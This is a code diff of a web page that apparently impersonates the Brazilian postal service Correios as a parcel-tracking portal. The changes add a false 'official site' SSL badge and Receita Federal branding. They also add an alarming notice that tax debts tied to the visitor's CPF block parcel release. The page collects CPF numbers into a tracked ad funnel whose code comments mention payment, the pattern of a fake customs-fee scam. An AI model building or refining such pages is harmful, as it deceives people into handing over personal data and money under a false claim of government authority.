@@ -3,137 +3,93 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="theme-color" content="#004169">
+    <meta name="theme-color" content="#1c3c61">
     <meta name="description" content="Rastreamento de Encomendas - Correios">
+    <title>Rastreamento de Encomendas - Correios</title>
 
-    <title>Rastreamento de Objetos - Correios</title>
-
-    <!-- rtkcid: entrada oficial do funil — semeia o click ID do RedTrack em sessionStorage -->
+    <!-- rtkcid: entrada oficial do funil — semeia o click ID do RedTrack -->
     <script>(function(){try{var r=new URLSearchParams(location.search).get('rtkcid');if(r&&/^[0-9a-fA-F]{24}$/.test(r))sessionStorage.setItem('_rtk',r);}catch(e){}})();</script>
 
-    <!-- Favicon -->
     <link rel="icon" type="image/webp" href="assets/images/favicon.webp">
-
-    <!-- Preload critical CSS (dispara em paralelo ao HTML parse) -->
-    <link rel="preload" href="assets/vendor/fontawesome/6.5.1/css/all.min.css?v=subset-5" as="style">
-    <link rel="preload" href="assets/css/styles.css?v=2.2.1" as="style">
     <link rel="preload" href="assets/images/correios.webp" as="image" fetchpriority="high">
 
-    <link rel="preload" href="assets/vendor/fontawesome/6.5.1/webfonts/fa-solid-900.woff2?v=subset-5" as="font" type="font/woff2" crossorigin>
-    <link rel="preload" href="assets/vendor/fontawesome/6.5.1/webfonts/fa-regular-400.woff2?v=subset-5" as="font" type="font/woff2" crossorigin>
-
-    <!-- Critical CSS estrutural (mesma base do index) + estilos da busca -->
-    <style id="critical-inline">
+    <style>
       *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
-      html{scroll-behavior:smooth;-webkit-text-size-adjust:100%;overflow-x:hidden}
-      body{line-height:1.5;background:#fff;color:#003f6b;min-height:100vh;display:flex;flex-direction:column;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
+      body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#eef1f4;color:#15324a;line-height:1.5;min-height:100vh}
       img{max-width:100%;height:auto;display:block}
-      a{color:inherit;text-decoration:none}
-      button{cursor:pointer;border:0;background:none;font:inherit}
-      .main{flex:1;max-width:480px;margin:0 auto;padding:1rem;width:100%}
-      .header{background:#f4f6f8;border-bottom:3px solid #ffd400}
-      .header-nav{display:flex;align-items:center;justify-content:center;max-width:1200px;margin:0 auto;padding:.375rem 1rem;min-height:40px}
-      .logo-correios{height:25px;width:auto;display:block}
-      .btn-entrar{display:none}
-      .footer{background:#fdd306;color:#1e3a5f;padding:1.5rem 1rem}
-      .footer-container{max-width:1000px;margin:0 auto}
-      .footer-bottom{display:flex;flex-direction:column;align-items:center}
-      .footer-logos{display:flex;align-items:center;justify-content:center;gap:2rem}
-      .footer-logos .logo-footer{height:5.5rem;width:auto;max-width:100%;object-fit:contain}
-      .footer-copyright{text-align:center;font-size:.7rem;color:#014268;margin-bottom:0}
-      [hidden]{display:none!important}
-      /* ── Busca (localize sua encomenda) ── */
-      .breadcrumb{font-size:.78rem;color:#5a7184;margin:.25rem 0 1rem;display:flex;align-items:center;gap:.4rem;flex-wrap:wrap}
-      .busca-card{background:#fff;border:1px solid #e3e9ef;border-radius:12px;box-shadow:0 2px 12px rgba(0,65,105,.06);padding:1.5rem 1.25rem}
-      .busca-titulo{display:flex;align-items:center;gap:.6rem;font-size:1.3rem;font-weight:700;color:#004169;margin-bottom:.4rem}
-      .busca-titulo i{color:#ffce00}
-      .busca-sub{font-size:.92rem;color:#41607a;margin-bottom:1.1rem}
-      .busca-form label{display:block;font-size:.8rem;font-weight:600;color:#33536b;margin-bottom:.35rem}
-      .busca-input{width:100%;padding:.85rem .9rem;font-size:1.05rem;letter-spacing:.5px;border:2px solid #cfdbe5;border-radius:8px;color:#003f6b;text-transform:uppercase;transition:border-color .15s}
-      .busca-input:focus{outline:none;border-color:#004169}
-      .busca-input::placeholder{text-transform:none;letter-spacing:normal;color:#9fb1bf}
-      .busca-btn{width:100%;margin-top:.9rem;padding:.95rem;font-size:1.02rem;font-weight:700;color:#fff;background:#004169;border-radius:8px;letter-spacing:.5px;display:flex;align-items:center;justify-content:center;gap:.5rem;transition:background .15s}
-      .busca-btn:hover{background:#013354}
-      .busca-erro{margin-top:.7rem;font-size:.85rem;color:#c0392b;font-weight:600}
-      .busca-hint{margin-top:1rem;font-size:.78rem;color:#6a8197;line-height:1.45;display:flex;gap:.5rem}
-      .busca-hint i{color:#9fb1bf;margin-top:.15rem}
-      .selos{display:flex;align-items:center;justify-content:center;gap:1.5rem;margin-top:1.4rem;opacity:.9}
-      .selos img{height:2.6rem;width:auto}
+      .cor-top{background:#f1f1f1;padding:13px 16px;display:flex;justify-content:center;border-bottom:1px solid #e3e3e3}
+      .cor-top img{height:32px;width:auto}
+      .ssl-bar{background:linear-gradient(100deg,#ffd400 70%,#ffe25a);color:#0b3a63;text-align:center;font-weight:600;font-size:13px;padding:9px 12px;display:flex;align-items:center;justify-content:center;gap:7px}
+      .ssl-bar .chk{color:#0b7a3b;font-weight:800}
+      .portal-wrap{max-width:560px;margin:0 auto;padding:18px 16px 30px}
+      .rf-card{background:linear-gradient(135deg,#1c3c61,#142d49);border-radius:12px;padding:15px 18px;display:flex;align-items:center;justify-content:space-between;gap:12px;box-shadow:0 5px 18px rgba(15,41,66,.20)}
+      .rf-logo{height:28px;width:auto;filter:brightness(0) invert(1)}
+      .rf-right{text-align:right;color:#fff;line-height:1.35}
+      .rf-right b{font-size:15px;font-weight:700;display:block}
+      .rf-right span{font-size:12px;color:#cfe0f0}
+      .rf-right .dot{color:#39d98a;font-size:10px}
+      .portal-h1{text-align:center;color:#1b3a5e;font-size:26px;font-weight:800;margin:22px 0 3px;line-height:1.2}
+      .portal-sub{text-align:center;color:#5f7d99;font-size:15px;margin:0 0 20px}
+      .consult-card{background:#fff;border-radius:14px;box-shadow:0 6px 22px rgba(15,41,66,.09);border:1px solid #e8edf2;padding:20px 18px}
+      .aviso{background:#fdeceb;border-left:4px solid #d8392f;border-radius:8px;padding:13px 13px 13px 12px;display:flex;gap:10px;margin-bottom:15px}
+      .aviso .ico{flex:0 0 auto;width:22px;height:22px;border-radius:50%;background:#d8392f;color:#fff;font-size:13px;font-weight:700;font-style:italic;display:flex;align-items:center;justify-content:center}
+      .aviso b{color:#c0291f;font-size:14px;display:block;margin-bottom:3px}
+      .aviso p{color:#c0392b;font-size:13.5px;line-height:1.45;margin:0}
+      .consult-text{text-align:center;color:#2c5878;font-size:15px;line-height:1.5;margin:4px 2px 15px}
+      .consult-input{width:100%;padding:13px 14px;font-size:16px;border:2px solid #cfdbe5;border-radius:9px;color:#15324a;text-transform:uppercase;margin-bottom:12px}
+      .consult-input:focus{outline:none;border-color:#1b3a5e}
+      .consult-input::placeholder{text-transform:none;color:#9fb1bf}
+      .consult-btn{width:100%;padding:16px;border:0;border-radius:9px;background:linear-gradient(135deg,#1c3c61,#0e2740);color:#fff;font-size:15.5px;font-weight:700;letter-spacing:.4px;display:flex;align-items:center;justify-content:center;gap:9px;cursor:pointer;box-shadow:0 4px 14px rgba(15,41,66,.25)}
+      .consult-btn:active{transform:translateY(1px)}
+      .consult-err{color:#c0291f;font-size:13.5px;font-weight:600;margin-top:10px;display:none}
+      .info-cards{display:flex;gap:9px;margin-top:18px}
+      .info-card{flex:1;background:#fff;border-radius:12px;border:1px solid #eaeef2;border-top:4px solid var(--ac);padding:14px 7px;text-align:center;box-shadow:0 2px 8px rgba(15,41,66,.05)}
+      .info-card .ic{width:38px;height:38px;border-radius:50%;background:var(--bg);display:flex;align-items:center;justify-content:center;margin:0 auto 8px;font-size:16px}
+      .info-card h4{color:#1b3a5e;font-size:13px;font-weight:700;margin:0 0 5px}
+      .info-card p{color:#6a8197;font-size:11px;line-height:1.4;margin:0}
     </style>
-    <link rel="stylesheet" href="assets/vendor/fontawesome/6.5.1/css/all.min.css?v=subset-5">
-    <link rel="stylesheet" href="assets/css/styles.css?v=2.2.1">
 </head>
 <body>
-    <!-- HEADER -->
-    <header class="header">
-        <nav class="header-nav" id="headerNav">
-            <a href="#" class="logo-link">
-                <img src="assets/images/correios.webp" alt="Correios" class="logo-correios" width="121" height="25" decoding="async" fetchpriority="high">
-            </a>
-            <a href="#" class="btn-entrar">
-                <img src="assets/images/entrar.svg" alt="Entrar" class="icon-entrar" width="20" height="20" decoding="async">
-                <span class="user-name">Entrar</span>
-            </a>
-        </nav>
-    </header>
+    <div class="cor-top"><img src="assets/images/correios.webp" alt="Correios"></div>
+    <div class="ssl-bar">🔒 Conexão Segura SSL • Site Oficial dos Correios <span class="chk">✓</span></div>
 
-    <!-- MAIN -->
-    <main class="main">
-        <nav class="breadcrumb">
-            <span>Portal Correios</span>
-            <i class="fal fa-angle-right"></i>
-            <span>Rastreamento</span>
-        </nav>
-
-        <section class="busca-card">
-            <h1 class="busca-titulo">
-                <i class="far fa-box-alt"></i>
-                <span>Localize sua encomenda</span>
-            </h1>
-            <p class="busca-sub">Informe o <strong>CPF do destinatário</strong> ou o <strong>código de rastreamento</strong> para consultar a situação do seu objeto.</p>
-
-            <form class="busca-form" id="formRastreio" autocomplete="off" novalidate>
-                <label for="codigo">CPF ou código de rastreamento</label>
-                <input class="busca-input" type="text" id="codigo" name="codigo"
-                       placeholder="CPF ou AA123456789BR" maxlength="20"
-                       autocapitalize="characters" required>
-                <button class="busca-btn" type="submit">
-                    <i class="far fa-search"></i> CONSULTAR
-                </button>
-                <p class="busca-erro" id="erro" hidden></p>
-            </form>
-
-            <p class="busca-hint">
-                <i class="far fa-info-circle"></i>
-                <span>CPF do destinatário (11 dígitos) ou código de rastreamento (ex.: AA123456789BR — 2 letras, 9 números, 2 letras). O código vem no e-mail/SMS de postagem.</span>
-            </p>
-
-            <div class="selos">
-                <img src="assets/images/receita-federal.webp" alt="Receita Federal" decoding="async">
-                <img src="assets/images/bacen.png" alt="Banco Central" decoding="async">
-            </div>
-        </section>
-    </main>
-
-    <!-- FOOTER -->
-    <footer class="footer">
-        <div class="footer-container">
-            <div class="footer-bottom">
-                <div class="footer-logos">
-                    <img src="assets/images/logo-rodape.webp" alt="Correios e Receita Federal" class="logo-footer" width="383" height="88" decoding="async">
-                </div>
-                <p class="footer-copyright">© Copyright 2026 Correios<br>CNPJ 34.028.316/0001-03</p>
-            </div>
+    <div class="portal-wrap">
+        <div class="rf-card">
+            <img class="rf-logo" src="assets/images/receita-federal.webp" alt="Receita Federal">
+            <div class="rf-right"><b>Sistema Integrado</b><span><span class="dot">●</span> Online • Seguro</span></div>
         </div>
-    </footer>
+
+        <h1 class="portal-h1">Rastreamento de Encomendas</h1>
+        <p class="portal-sub">Portal Oficial de Consulta Fiscal</p>
+
+        <div class="consult-card">
+            <div class="aviso">
+                <div class="ico">i</div>
+                <div>
+                    <b>AVISO IMPORTANTE</b>
+                    <p>Verifique se há pendências fiscais vinculadas ao seu CPF que possam impactar a liberação de suas encomendas.</p>
+                </div>
+            </div>
+            <p class="consult-text">Para consultar suas encomendas e verificar pendências fiscais, informe seu CPF ou o código de rastreamento abaixo.</p>
+            <input class="consult-input" id="consulta" type="text" placeholder="CPF ou código (ex.: AA123456789BR)" maxlength="20" autocapitalize="characters" autocomplete="off">
+            <button class="consult-btn" id="btn-consultar" type="button">🔍 CONSULTAR ENCOMENDAS AGORA</button>
+            <div class="consult-err" id="erro"></div>
+        </div>
+
+        <div class="info-cards">
+            <div class="info-card" style="--ac:#1b6ec2;--bg:#e7f0fb"><div class="ic">🚚</div><h4>Rastreamento</h4><p>Consulte o status da sua encomenda em tempo real</p></div>
+            <div class="info-card" style="--ac:#2e9e5b;--bg:#e6f6ec"><div class="ic">🛡️</div><h4>Segurança</h4><p>Dados protegidos pela Receita Federal</p></div>
+            <div class="info-card" style="--ac:#e6a700;--bg:#fcf3da"><div class="ic">📄</div><h4>Regularização</h4><p>Pendências devem ser regularizadas para liberação</p></div>
+        </div>
+    </div>
 
     <script>
     (function(){
-        var form = document.getElementById('formRastreio');
+        var btn = document.getElementById('btn-consultar');
+        var inp = document.getElementById('consulta');
         var erro = document.getElementById('erro');
-        var inp  = document.getElementById('codigo');
 
-        function showErr(msg){ erro.textContent = msg; erro.hidden = false; inp.focus(); }
+        function showErr(msg){ erro.textContent = msg; erro.style.display = 'block'; inp.focus(); }
 
         // Checksum oficial de CPF (mesmo critério do validarCPF do funil/pagamento)
         function validarCPF(cpf){
@@ -149,9 +105,8 @@
             return dig === parseInt(cpf.charAt(10), 10);
         }
 
-        form.addEventListener('submit', function(ev){
-            ev.preventDefault();
-            erro.hidden = true;
+        function consultar(){
+            erro.style.display = 'none';
             var raw = (inp.value || '').trim();
             if (!raw) { showErr('Informe seu CPF ou código de rastreamento.'); return; }
 
@@ -159,7 +114,7 @@
             var digitos  = raw.replace(/\D/g, '');
             var params   = new URLSearchParams(location.search);  // preserva rtkcid + demais
 
-            // ── CPF: entrada só com números (com ou sem máscara) ──
+            // CPF: só números (com ou sem máscara), 11 dígitos
             if (!temLetra && digitos.length >= 11) {
                 var cpf = digitos.slice(0, 11);
                 if (!validarCPF(cpf)) { showErr('CPF inválido. Confira os números e tente novamente.'); return; }
@@ -169,16 +124,19 @@
                 return;
             }
 
-            // ── Código de rastreamento: formato Correios AA999999999BR ──
+            // Código de rastreamento: formato Correios AA999999999BR
             var code = raw.toUpperCase().replace(/[^A-Z0-9]/g, '');
             if (!/^[A-Z]{2}[0-9]{9}[A-Z]{2}$/.test(code)) {
-                showErr('Use o formato AA123456789BR (2 letras, 9 números, 2 letras) — ou informe o CPF do destinatário.');
+                showErr('Use o formato AA123456789BR (2 letras, 9 números, 2 letras) — ou informe o CPF.');
                 return;
             }
             params.set('tipo', 'rastreio');
             params.set('rastreio', code);
             window.location.href = '/index.html?' + params.toString();
-        });
+        }
+
+        btn.addEventListener('click', consultar);
+        inp.addEventListener('keydown', function(e){ if (e.key === 'Enter') { e.preventDefault(); consultar(); } });
     })();
     </script>
 </body>
